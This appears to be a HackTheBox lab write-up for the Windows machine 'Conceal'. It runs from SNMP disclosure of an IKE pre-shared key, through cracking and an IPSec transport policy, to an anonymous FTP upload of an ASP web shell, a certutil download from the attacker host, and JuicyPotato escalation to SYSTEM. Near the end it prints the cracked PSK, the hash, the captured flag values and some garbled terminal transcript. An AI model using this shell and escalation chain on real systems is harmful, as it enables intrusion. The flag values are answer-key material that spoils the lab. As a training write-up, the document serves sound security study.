---
tags: [HTB, Conceal, Windows, SNMP, IPSec, IKEv1, FTP, IIS, SeImpersonate, JuicyPotato, Hard]
platform: Windows
os: Windows
hostname: conceal
difficulty: Hard
ip: $BoxIP
status: Complete
aliases: [Conceal]
---

# Windows: Conceal, Full Walkthrough

## The gist

Conceal hides the real TCP attack surface behind an IPSec transport-mode requirement. The first full TCP scan looked filtered, but UDP enumeration exposed SNMP and IKEv1 on UDP 161 and UDP 500. SNMP disclosed a recoverable IKE pre-shared key, and strongSwan used that key to establish a CHILD_SA for the target's TCP traffic.

Once the transport policy was active, the host exposed anonymous FTP and IIS. The FTP root mapped to the IIS `/upload/` directory, so an ASP command shell gave execution as `conceal\destitute`. That token had `SeImpersonatePrivilege`, allowing a tested JuicyPotato COM class to create a SYSTEM process.

> [!important] Key finding
> TCP enumeration alone was misleading. The reliable route was UDP discovery → SNMP disclosure → IKEv1 PSK recovery → IPSec transport policy → anonymous FTP-to-IIS upload → ASP command execution → SeImpersonate → JuicyPotato SYSTEM.

## Box information

| Field | Value |
|---|---|
| Platform | Windows 10 Enterprise x64, build 15063 |
| Difficulty | Hard |
| Initial UDP services | SNMP on UDP 161, IKE/isakmp on UDP 500 |
| Post-IPSec TCP services | FTP 21, HTTP 80, MSRPC 135, NetBIOS 139, SMB 445 |
| Initial access | Anonymous FTP write into a directory served by IIS |
| Foothold | Classic ASP command shell as `conceal\destitute` |
| Privilege escalation | `SeImpersonatePrivilege` and JuicyPotato |
| Alternative advertised path | CVE-2018-8440 was not needed for the verified route |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Run the initial TCP and UDP scans | See section 1 below |
| 2 | Use SNMP to recover the IKE material privately | See section 2 below |
| 3 | Fingerprint IKE before configuring IPSec | See section 3 below |
| 4 | Build a scoped IKEv1 transport-mode policy | See section 4 below |
| 5 | Re-scan TCP through the active policy | See section 5 below |
| 6 | Confirm the FTP root and its IIS mapping | See section 6 below |

## Evidence and loot

The write-up was reconstructed from the private transcript and evidence under the Conceal workspace. The vault contains only sanitized commands and non-secret identity evidence, with screenshot links pointing to the external box workspace. The PSK material, cracked value, raw transcript, and flag evidence remain outside the vault.

Relevant private evidence includes the full TCP and UDP scans, `loot/ike-scan.txt`, `loot/ipsec-start.txt`, the XFRM policy output, the post-IPSec service scan, the ASP source, and the transfer log.

## Variables

Load the helper variables first. Keep the target address, local VPN address, recovered PSK, and any proof values in private shell state or private loot only.

```bash
boxload
boxset BoxName Conceal
boxset BoxDir "$HOME/Platforms/HackTheBox/Conceal"
boxset Wordlist /usr/share/wordlists/rockyou.txt
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset FTPPort 21
boxset WebPort 80
boxset SNMPPort 161
boxset IKEPort 500
boxset NATTPort 4500
boxset ListenPort 8000
boxset PotatoPort 9001
boxset PotatoPath 'C:\Windows\Temp\jp.exe'
boxset WebshellPath cmd.asp
boxset RemoteWebshellPath upload/cmd.asp
boxset ProofFile proof.txt
boxset ProofPath 'C:\inetpub\wwwroot\upload\proof.txt'
boxset CLSID '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
mkdir -p "$BoxDir/nmap" "$BoxDir/loot" "$BoxDir/exploits" "$BoxDir/www" "$BoxDir/screenshots"
```

`$BoxIP` must already be loaded by `boxload` or `boxstart`. `$LocalIP` is the VPN address used to reach the target and to serve the JuicyPotato binary. `$Password` is reserved for the recovered PSK and is never printed in this note.

## 1. Run the initial TCP and UDP scans

The first TCP scan establishes whether ordinary service discovery works, while the UDP scan checks protocols that can be completely invisible to a TCP-only workflow. Conceal is a useful reminder that a filtered TCP result is not the same as a dead host. UDP `open` results for SNMP and ISAKMP provided the route forward.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 1200 --max-retries 2 -T4 \
  -oA "$BoxDir/nmap/tcp-all" "$BoxIP"

sudo nmap -Pn -n -sU --top-ports 100 --max-retries 1 -T4 \
  -oA "$BoxDir/nmap/udp-top100" "$BoxIP"
```

The first result showed all TCP ports as filtered. The UDP result showed SNMP on UDP 161 and ISAKMP, the IKE service name used by Nmap, on UDP 500.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/1.nmap-tcp-all-filtered.png>)

SCREENSHOT: The full TCP scan appears filtered, so the assessment must continue with UDP discovery.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/2.nmpa-udp-top-100.png>)

SCREENSHOT: The UDP scan exposes SNMP and IKE, which are the prerequisites for the concealed TCP surface.

> [!tip] Efficiency
> Start the TCP and UDP scans in separate terminals. Do not wait for a filtered full-port result before checking the common UDP ports.

## 2. Use SNMP to recover the IKE material privately

SNMP is a management protocol that can expose system metadata through a community string. The system subtree is enough here because the Windows `sysContact` value contained an IKE PSK hash. Save the walk to private loot, extract only the hash into a separate private file, and let John recover the value without copying it into the write-up.

```bash
snmpwalk -v1 -c public -On "$BoxIP" 1.3.6.1.2.1.1 \
  | tee "$BoxDir/loot/snmp-system.txt"

awk -F' - ' '/IKE VPN password PSK/ {print $2; exit}' \
  "$BoxDir/loot/snmp-system.txt" > "$BoxDir/loot/psk.hash"

john --format=raw-md5 --wordlist="$Wordlist" "$BoxDir/loot/psk.hash"
boxset Password "$(john --show --format=raw-md5 "$BoxDir/loot/psk.hash" \
  | awk -F: 'NR==1 {print $2; exit}')"
```

The important result was not the literal secret. It was that SNMP disclosed enough information to recover the pre-shared key required for IKE authentication. Keep the hash, John output, and recovered PSK in `$BoxDir/loot/` only.

> [!warning] Sensitive evidence
> Do not paste the SNMP contact value, the hash, or the recovered PSK into a shared note or screenshot caption.

## 3. Fingerprint IKE before configuring IPSec

IKE, the Internet Key Exchange protocol, negotiates the keys and parameters used by IPSec. `ike-scan` is useful here because it confirms the authentication mode and proposal before strongSwan is configured. Main Mode, 3DES, SHA1, MODP1024, and PSK matched the server profile observed in the private loot.

```bash
sudo ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"
```

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/5.ike-scan.png>)

SCREENSHOT: `ike-scan` returns an IKEv1 Main Mode handshake with PSK authentication and a legacy 3DES/SHA1/MODP1024 proposal.

The vendor IDs also identified Windows, NAT traversal support, and IKE fragmentation. A returned handshake is not yet access to TCP services. It only proves that the IKE endpoint is reachable and gives the parameters needed for a full authenticated negotiation.

## 4. Build a scoped IKEv1 transport-mode policy

IPSec transport mode protects traffic between two hosts without wrapping an entire routed subnet. The `rightsubnet=$BoxIP[tcp]` selector is the important detail: it asks the server to protect TCP traffic to the target rather than negotiating an unrestricted or mismatched traffic selector. The `!` suffixes force the proposal observed by `ike-scan` instead of allowing a different fallback.

```bash
cat > "$BoxDir/ipsec.conf" <<EOF
config setup
    uniqueids=no
    charondebug="ike 2, knl 2, cfg 2"

conn conceal
    keyexchange=ikev1
    authby=secret
    type=transport
    left=%defaultroute
    right=$BoxIP
    rightsubnet=$BoxIP[tcp]
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    auto=start
EOF

cat > "$BoxDir/ipsec.secrets" <<EOF
%any %any : PSK "$Password"
EOF

chmod 600 "$BoxDir/ipsec.secrets"
```

`ipsec.secrets` contains the recovered PSK, so its contents should stay private. The configuration uses strongSwan's legacy starter because it was available locally and could negotiate the Windows peer's IKEv1 proposal.

Check for an existing local listener before starting the policy. A stale `charon` process can hold UDP 500 and make the new starter appear to fail before it has contacted the target.

```bash
sudo ss -ulnp | grep ":$IKEPort" || true
sudo ipsec stop 2>/dev/null || true
```

Start the daemon in a private mount namespace. The bind mount supplies the local secrets file at `/etc/ipsec.secrets` for this process without overwriting the system-wide file.

```bash
sudo unshare --mount --propagation private bash -lc \
  "mount --bind '$BoxDir/ipsec.secrets' /etc/ipsec.secrets && \
   exec /usr/lib/ipsec/starter --nofork --conf '$BoxDir/ipsec.conf'" \
  2>&1 | tee "$BoxDir/loot/ipsec-start.txt" &

sleep 5
sudo ip xfrm policy
sudo ip xfrm state
```

XFRM is Linux's kernel framework for applying IP transformation policies. The success condition is an established IKE_SA and a CHILD_SA whose traffic selector includes the target TCP endpoint.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/6.ipsec-xfrm.png>)

SCREENSHOT: The XFRM policy confirms that the authenticated transport policy is installed locally.

> [!warning] Troubleshooting
> If the IKE_SA establishes but the CHILD_SA fails, verify the `rightsubnet=$BoxIP[tcp]` selector and the 3DES/SHA1 proposals. If UDP 500 is already bound, stop the stale local strongSwan process before retrying.

## 5. Re-scan TCP through the active policy

The transport policy changes what the target exposes, so the original TCP scan is no longer the authoritative service list. Run a targeted TCP connect scan against the ports that were tested in the session and save it separately from the pre-IPSec scan.

```bash
boxset OpenPorts "21,80,135,139,445,3389,5985,8080"
sudo nmap -Pn -n -sT -sV --version-light \
  -p "$OpenPorts" -oA "$BoxDir/nmap/post-ipsec" "$BoxIP"
```

The post-IPSec result exposed Microsoft FTP on 21, Microsoft IIS 10.0 on 80, MSRPC on 135, NetBIOS on 139, and SMB on 445. RDP, WinRM, and the alternate HTTP port were closed in this run.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/7.nmap-post-ipsec.png>)

SCREENSHOT: The authenticated transport policy reveals FTP and IIS, which become the initial-access path.

## 6. Confirm the FTP root and its IIS mapping

Anonymous FTP is a file-transfer service that may permit read access, write access, or both. An empty listing does not prove that uploads are impossible, so test a harmless marker and request the corresponding HTTP path. The response showed that the FTP root mapped to the IIS `/upload/` directory.

```bash
curl --ftp-pasv --user anonymous:anonymous --list-only \
  "ftp://$BoxIP/"

printf '%s\n' 'test' \
  | curl --ftp-pasv --user anonymous:anonymous \
      --upload-file - "ftp://$BoxIP/test.txt"

curl -sS "http://$BoxIP/upload/test.txt"
```

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/8.ftp-iis-mapping.png>)

SCREENSHOT: The harmless FTP marker is reachable through HTTP under `/upload/`, proving a write primitive into the IIS-served directory.

This mapping matters because uploading to the FTP root and requesting `/test.txt` would test the wrong web path. The correct relationship is FTP `/cmd.asp` to HTTP `/upload/cmd.asp`.

## 7. Upload a minimal ASP command shell

Classic ASP is a server-side scripting technology supported by older IIS installations. The shell below passes a URL-decoded `cmd` value to `cmd.exe` and returns standard output, which keeps the first proof command observable and avoids a blind callback.

```bash
cat > "$BoxDir/www/cmd.asp" <<'EOF'
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
EOF

curl --ftp-pasv --user anonymous:anonymous \
  --upload-file "$BoxDir/www/cmd.asp" "ftp://$BoxIP/cmd.asp"

curl -sS -G --data-urlencode 'cmd=whoami' \
  "http://$BoxIP/$RemoteWebshellPath"
```

The result identified the IIS worker process as the low-privilege `conceal\destitute` account. The ASP source is intentionally minimal: it is enough to prove command execution and run the next local-enumeration checks.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/9.webshell-rce.png>)

SCREENSHOT: The uploaded ASP file returns command output over HTTP and confirms the Windows account executing it.

> [!warning] Gotcha
> FTP success is not execution proof. Always request the exact IIS path and run `whoami` before selecting a privilege-escalation route.

## 8. Triage the foothold and confirm SeImpersonatePrivilege

Token privileges describe actions granted to the current Windows access token. `SeImpersonatePrivilege` allows a process to impersonate a more privileged token when it can trigger the right local authentication flow, which is why Potato-family tools are relevant here.

```bash
curl -sS -G --data-urlencode 'cmd=whoami /priv' \
  "http://$BoxIP/$RemoteWebshellPath"

curl -sS -G --data-urlencode 'cmd=systeminfo' \
  "http://$BoxIP/$RemoteWebshellPath" \
  | tee "$BoxDir/loot/systeminfo.txt"
```

The token had `SeImpersonatePrivilege` enabled. The host was x64 Windows 10 Enterprise build 15063, so the downloaded Potato binary needed to match the target architecture and the selected COM class needed to work on this older build.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/10.whoami-priv.png>)

SCREENSHOT: `whoami /priv` shows the enabled impersonation privilege that makes the Potato route viable.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/11.systeminfo.png>)

SCREENSHOT: `systeminfo` confirms the target build and architecture used to choose the escalation binary.

## 9. Transfer and test JuicyPotato

JuicyPotato abuses COM authentication to obtain and use a SYSTEM impersonation token. Its local `-l` port is a COM listener on the target and is separate from any Kali callback port. Test the CLSID with `-z` first, then use the same identifier for the proof process.

Download the reviewed release into the local evidence workspace and serve only that directory.

```bash
curl -L -o "$BoxDir/exploits/jp.exe" \
  https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
file "$BoxDir/exploits/jp.exe"

python3 -m http.server "$ListenPort" \
  --directory "$BoxDir/exploits" \
  > "$BoxDir/loot/http-transfer.log" 2>&1 &
```

Use `certutil.exe` on the target to download the binary. The command is sent through the ASP shell, while the local HTTP log proves that the target fetched the file.

```bash
curl -sS -G --data-urlencode \
  "cmd=certutil.exe -urlcache -split -f http://$LocalIP:$ListenPort/jp.exe $PotatoPath" \
  "http://$BoxIP/$RemoteWebshellPath"

curl -sS -G --data-urlencode \
  "cmd=$PotatoPath -z -l $PotatoPort -c $CLSID" \
  "http://$BoxIP/$RemoteWebshellPath"
```

The `-z` test returned a successful COM authentication result for the selected CLSID. This is stronger evidence than assuming a CLSID from a generic list will work on every Windows build.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/12.certutil-transfer.png>)

SCREENSHOT: `certutil` retrieves the Potato binary from the controlled Kali HTTP server.

## 10. Use JuicyPotato to create a SYSTEM proof

Use a harmless identity command first and write its output to the IIS upload directory. This proves process creation and token impersonation without starting a reverse shell, and the result can be retrieved over the already-confirmed HTTP path.

```bash
curl -sS -G --data-urlencode \
  "cmd=$PotatoPath -t * -p C:\Windows\System32\cmd.exe -a \"/c whoami > $ProofPath\" -l $PotatoPort -c $CLSID" \
  "http://$BoxIP/$RemoteWebshellPath"

curl -sS "http://$BoxIP/upload/proof.txt" \
  | tee "$BoxDir/loot/system-proof.txt"
```

The returned proof showed `NT AUTHORITY\SYSTEM`, and the process creation result confirmed that `CreateProcessWithTokenW` succeeded. At this point the required privilege was proved. Do not put any flag contents in the shared write-up.

![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/13.juicypotato-system.png>)

SCREENSHOT: JuicyPotato creates the proof process with a SYSTEM token.

> [!tip] Efficiency
> A file-based `whoami` proof is easier to review than a first attempt at a reverse shell. It separates the token-abuse question from listener, payload, and firewall troubleshooting.

## 11. Clean up the target and local workspace

Cleanup removes the ASP shell, proof file, and temporary IPSec state created during the run. The downloaded binary path is recorded so it can be removed before the webshell on a future replay. Verify the HTTP path after deleting the FTP files, then stop strongSwan so the local XFRM policy and UDP 500 listener do not affect the next box.

```bash
curl --ftp-pasv --user anonymous:anonymous \
  --quote "DELE $WebshellPath" "ftp://$BoxIP/"
curl --ftp-pasv --user anonymous:anonymous \
  --quote "DELE proof.txt" "ftp://$BoxIP/"

curl -sS -o /dev/null -w '%{http_code}\n' \
  "http://$BoxIP/$RemoteWebshellPath"

sudo ipsec stop 2>/dev/null || true
pkill -f "python3 -m http.server $ListenPort" 2>/dev/null || true
boxdone
```

The cleanup paths are the paths recorded during this run. If the ASP shell disappears during testing, re-upload it before the final proof, then remove it again during closeout. Never delete unrelated files from the FTP root.

## 12. Troubleshooting map

| Symptom | Likely cause | Next check |
|---|---|---|
| Full TCP scan shows only filtered ports | IPSec is gating the TCP surface | Run the UDP top-port scan and inspect UDP 161 and UDP 500 |
| `ike-scan` returns no handshake | VPN route, target state, or UDP filtering | Check `ip route get $BoxIP`, rerun the targeted UDP scan, and confirm the port is still open |
| IKE_SA establishes but CHILD_SA fails | Wrong traffic selector or ESP proposal | Keep `rightsubnet=$BoxIP[tcp]`, compare the proposal with `ike-scan`, and read `ipsec-start.txt` |
| UDP 500 is already bound locally | Stale `charon` or strongSwan starter | Run `sudo ss -ulnp | grep ":$IKEPort"`, stop the stale local IPSec process, and retry in the private namespace |
| FTP upload succeeds but HTTP returns 404 | FTP root and HTTP URL path differ | Upload a harmless marker and test the mapped path, which was `/upload/` here |
| ASP file downloads instead of executing | IIS handler mapping or wrong path | Confirm the exact URL and use the FTP-to-IIS upload stage before changing extensions |
| ASP shell disappears between commands | IIS or the lab instance reset the uploaded file | Re-upload the shell, rerun `whoami`, and continue from the last verified identity |
| JuicyPotato returns no SYSTEM proof | Wrong architecture, CLSID, listener port, or token | Confirm `systeminfo`, test the CLSID with `-z`, and use a file-based `whoami` proof |

## 13. RUNBOOK V2 Stages Used

1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and record the full TCP scan.
2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: treat the filtered TCP result as incomplete and route to UDP enumeration.
3. [[OSCP/RUNBOOK V2/Linux - SNMP Enum|SNMP Enumeration]]: walk the system subtree and preserve sensitive output privately.
4. [[OSCP/RUNBOOK V2/Windows - IKE-IPSec Transport|Windows - IKE/IPSec Transport]]: fingerprint IKEv1, establish the PSK-authenticated transport policy, and verify XFRM selectors.
5. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: re-scan the now-reachable TCP services.
6. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: identify IIS and the FTP-to-web mapping.
7. [[OSCP/RUNBOOK V2/Windows - FTP Enumeration|Windows - FTP Enumeration]]: test anonymous listing and write behavior.
8. [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload|Windows - Web - FTP Upload]]: upload and execute a minimal ASP shell.
9. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm the enabled impersonation privilege.
10. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test JuicyPotato with a verified CLSID.
11. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove files, stop listeners, remove the XFRM policy, and close the box.

## 14. Collect the flags

User flag: collected privately from the target during the session.

Root flag: collected privately from the target after SYSTEM proof.


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: e798d59c805acc5e8c29d9448e69c4a4
root: 867c42b63d54698757f1d25bf4ce32f2
```

## 15. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

### Completion checklist

- [x] Full TCP and UDP scans saved under `$BoxDir/nmap/`
- [x] SNMP output and IKE fingerprint saved to private loot
- [x] PSK recovered offline without copying it into the vault
- [x] IKEv1 transport policy established and XFRM selectors verified
- [x] Post-IPSec service scan saved separately
- [x] FTP root to IIS `/upload/` mapping confirmed with a harmless marker
- [x] ASP command shell uploaded and identity recorded
- [x] `SeImpersonatePrivilege` confirmed enabled
- [x] JuicyPotato CLSID tested before SYSTEM proof
- [x] SYSTEM identity proved without exposing flags
- [x] Uploaded files, local HTTP server, and IPSec state cleaned up
- [x] Runbook, command master, Seen in links, and master box list updated

## 16. Attack narrative in one page
1. Full TCP scan appeared filtered.
2. UDP scan found SNMP and IKEv1.
3. SNMP system metadata disclosed a recoverable IKE PSK hash.
4. John recovered the PSK privately.
5. `ike-scan` identified Main Mode, PSK, and the legacy proposal.
6. strongSwan established an IKE_SA and a TCP-scoped CHILD_SA in transport mode.
7. Post-IPSec enumeration exposed anonymous FTP and IIS.
8. Anonymous FTP write access mapped to the IIS `/upload/` directory.
9. Classic ASP command execution landed as `conceal\destitute`.
10. `SeImpersonatePrivilege` was enabled.
11. JuicyPotato with a tested COM class created a SYSTEM proof process.

## Tools used

| Tool | Role |
|---|---|
| Nmap | Full TCP, UDP, and post-IPSec service discovery |
| `snmpwalk` | Read the Windows system subtree through SNMP |
| John the Ripper | Recover the IKE PSK offline from private hash loot |
| `ike-scan` | Fingerprint IKEv1 Main Mode and the peer proposal |
| strongSwan | Authenticate IKEv1 and install the transport-mode XFRM policy |
| `curl` | Test FTP, HTTP mapping, ASP execution, and cleanup |
| `certutil.exe` | Transfer the reviewed Windows binary through the ASP shell |
| JuicyPotato | Abuse the enabled impersonation privilege for a SYSTEM proof |

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `conceal\destitute` | ASP `whoami` response | Low-privilege IIS command execution |
| IKE PSK | SNMP system metadata and offline John recovery | Authenticate the IKEv1 transport policy |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Conceal"
export BoxIP="10.129.1.82"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Conceal"
export Domain=""
export DCip=""
export Username=destitute
export Password=Dudecake1!
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort="80"
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `ipsec.secrets`

```text
%any %any : PSK "Dudecake1!"
```

#### `loot/psk.hash`

```text
9C8B1A372B1878851BE2C097031B6E43
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
.1.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
kali@kali:~/Platforms/HackTheBox/Conceal [09:23:09] $ =boxset Password "9C8B1A372B1878851BE2C097031B6E43"boxset"9C8B1A372B1878851BE2C09703[
$ [09:26:11] boxset Password "9C8B1A372B1878851BE2C097031B6E43"
$ [09:26:21] echo "9C8B1A372B1878851BE2C097031B6E43" > $BoxDir/loot/psk.hash
hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txt \
hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txt
  $BoxDir/loot/psk.hash
john --format=raw-md5 --show $BoxDir/loot/psk.hash
[+] Password=9C8B1A372B1878851BE2C097031B6E43 (saved to .env)
kali@kali:~/Platforms/HackTheBox/Conceal [09:26:11] $ =echo "9C8B1A372B1878851BE2C097031B6E43" > $BoxDir/loot/psk.hash
hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txtecho "9C8B1A372B1878851BE2C097031B6E43" >
john --format=raw-md5 --show $BoxDir/loot/psk.hashjohn
Warning: no OpenMP support for this hash type, consider --fork=4
kali@kali:~/Platforms/HackTheBox/Conceal [09:27:11] $ =boxset Password "Dudecake1!"boxse
$ [09:31:02] boxset Password 'Dudecake1!'
kali@kali:~/Platforms/HackTheBox/Conceal [09:30:40] $ =boxset Password "Dudecake1boxset"Dudecake1 Dudecake1'Dudecake1'Dudecake11!!'! !'>
[+] Password=Dudecake1! (saved to .env)
$ [09:36:55] cat > $BoxDir/ipsec.secrets << 'EOF'
$ [09:37:03] cat $BoxDir/ipsec.secrets
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
kali@kali:~/Platforms/HackTheBox/Conceal [09:32:58] $ =cat > $BoxDir/ipsec.secrets << 'EOF'
kali@kali:~/Platforms/HackTheBox/Conceal [09:36:55] $ =cat $BoxDir/ipsec.secretscat>
    authby=secret
  'mount --bind '"$BoxDir"'/ipsec.secrets /etc/ipsec.secrets && \
  2>&1 | tee $BoxDir/loot/ipsec-start.txt &sudo unshare'mount --bind '"$BoxDir"'/ipsec.secrets /etc/ipsec.secrets && \
kali@kali:~/Platforms/HackTheBox/Conceal [09:59:18] $ =llls -lh $BoxDir/exploits/jp.exelo                            loootloott t flag user
$ [09:59:43] loot flag user e798d59c805acc5e8c29d9448e69c4a4
$ [09:59:59] loot flag root 867c42b63d54698757f1d25bf4ce32f2
[+] Flag saved:  user = e798d59c805acc5e8c29d9448e69c4a4  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Conceal [09:59:43] $ =llloot flag user e798d59c805acc5e8c29d9448e69c4a4loloootloott t flag r                                    oot 867c42b63d54698757f1d25bf4ce32f2>
[+] Flag saved:  root = 867c42b63d54698757f1d25bf4ce32f2  →  loot/flags.txt
```


## Remediation recommendations

- Do not expose SNMP with a default community string. Restrict management access and remove sensitive protocol material from system metadata.
- Replace legacy IKEv1 and 3DES/SHA1/MODP1024 proposals with modern authenticated cryptography where compatibility permits.
- Do not allow anonymous FTP write access into an IIS-served directory. Separate upload and web roots and disable script execution in upload locations.
- Remove `SeImpersonatePrivilege` from service accounts that do not need it, and keep Windows builds patched.
- Monitor and restrict `certutil`-based downloads from service identities.

## Lessons learned and vault links

- A filtered TCP scan is not a conclusion. Check UDP and consider whether a network-layer policy is hiding the service surface.
- SNMP values are configuration data, not just host descriptions. Review `sysContact`, `sysName`, and the system subtree for protocol secrets.
- IKE discovery and IPSec access are different steps. `ike-scan` fingerprints the peer, while strongSwan proves that the PSK and traffic selectors work.
- Transport-mode selectors must match the protected protocol. A broad or incorrect selector can produce an IKE handshake without usable TCP access.
- FTP root paths and HTTP paths may not be identical. Test a harmless marker and confirm the mapping before uploading server-side code.
- Prove a Windows token privilege before choosing a Potato tool. The build, architecture, token privilege, CLSID, and listener port all matter.
- `SeImpersonatePrivilege` can be enough for SYSTEM on older Windows builds, making a kernel exploit unnecessary.
- A file-based identity proof is a clean escalation checkpoint before adding a callback payload.
- Cleanup must include both target-side web files and local IPSec state.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]: anonymous FTP-to-IIS ASP execution followed by x86 JuicyPotato.
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]]: Windows foothold and token escalation through a local service API.
- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]]: Windows web foothold, local service exposure, and staged cleanup.
- [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]]: Windows privilege triage and verified token-based escalation alternatives.

## External resources

- [HackTricks IPSec and IKE](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn.html)
- [ike-scan project](https://github.com/royhills/ike-scan)
- [strongSwan documentation](https://docs.strongswan.org/)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [Microsoft Classic ASP on IIS](https://learn.microsoft.com/en-us/iis/application-frameworks/building-and-running-aspnet-applications/classic-asp)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Windows - Service Scan]]
- [[RUNBOOK V2/Windows - Web Enum]]
- [[RUNBOOK V2/Windows - Shell Received]]
- [[RUNBOOK V2/Windows - Privilege Triage]]
- [[RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

Conceal combines network-layer discovery, protocol negotiation, a cross-service file-to-web primitive, and Windows token abuse. The transferable skill is keeping each gate evidence-driven: prove the hidden service, prove the authenticated policy, prove file execution, prove the token privilege, and only then escalate.
